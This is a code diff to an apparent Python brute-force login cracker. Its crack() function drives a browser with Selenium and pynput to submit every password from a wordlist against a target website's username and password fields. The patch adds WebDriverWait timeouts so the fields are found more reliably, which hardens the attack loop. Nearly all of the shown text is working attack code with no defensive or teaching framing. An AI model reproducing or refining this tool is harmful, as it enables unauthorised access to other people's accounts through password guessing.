@@ -4,6 +4,7 @@ import selenium # Selenium automates browsers. That's it!
 import requests # Handling HTTP requests
 from sys import stdout # For Prompts
 from selenium import webdriver # Used to control the browser
+from selenium.webdriver.support.ui import WebDriverWait
 from optparse import OptionParser # For argument support
 from pynput.keyboard import Key, Controller # Used to press enter
 
@@ -91,13 +92,13 @@ def crack(username, usersel, passsel, passlist, website):
         print(color.RED + '\n[!] '+color.WHITE + 'ChromeDriver binary not found')
         exit()
     browser.get(website) # Open target website
-    try: # Check if username field css selector is valid
-        Sel_user = browser.find_element_by_css_selector(usersel)
+    try: # Check if username field css selector is valid and available
+        Sel_user = WebDriverWait(browser, timeout=3).until(lambda d: d.find_element_by_css_selector(usersel))
     except selenium.common.exceptions.NoSuchElementException: # If the selector is invalid
         print(color.RED + '\n[!] '+ color.WHITE + 'Username field selector is invalid.')
         exit()
-    try: # Check if password field css selector is valid
-        Sel_pass = browser.find_element_by_css_selector(passsel)
+    try: # Check if password field css selector is valid and available
+        Sel_pass = WebDriverWait(browser, timeout=3).until(lambda d: d.find_element_by_css_selector(passsel))
     except selenium.common.exceptions.NoSuchElementException: # If the selector is invalid
         print(color.RED + '\n[!] '+ color.WHITE + 'Password field selector is invalid.')
         exit()
@@ -105,8 +106,8 @@ def crack(username, usersel, passsel, passlist, website):
     try: # Start the attack
         for password in f: # Run the attack untill the password list is over
             browser.get(website) # Open fresh website
-            Sel_user = browser.find_element_by_css_selector(usersel)
-            Sel_pass = browser.find_element_by_css_selector(passsel)
+            Sel_user = WebDriverWait(browser, timeout=3).until(lambda d: d.find_element_by_css_selector(usersel))
+            Sel_pass = WebDriverWait(browser, timeout=3).until(lambda d: d.find_element_by_css_selector(passsel))
             Sel_user.send_keys(username) # Enter username
             Sel_pass.send_keys(password) # Enter password
             keyboard.press(Key.enter)
